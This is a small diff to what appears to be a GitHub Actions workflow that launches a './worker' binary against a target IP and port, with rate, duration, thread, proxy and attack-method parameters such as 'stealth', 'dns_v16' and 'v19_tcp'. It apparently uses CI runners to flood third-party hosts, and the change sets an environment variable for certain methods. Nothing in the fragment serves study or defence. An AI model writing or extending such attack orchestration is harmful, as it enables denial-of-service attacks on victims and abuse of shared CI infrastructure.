@@ -175,7 +175,7 @@ jobs:
         fi
         
         if [ "$METHOD" = "dns_v16" ] || [ "$METHOD" = "stealth" ] || [ "$METHOD" = "v19_tcp" ] || [ "$METHOD" = "v20_ws" ] || [ "$METHOD" = "v18_tcp" ]; then
-          sudo ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG
+          sudo GITHUB_ACTIONS=true ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG
         else
           sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
         fi
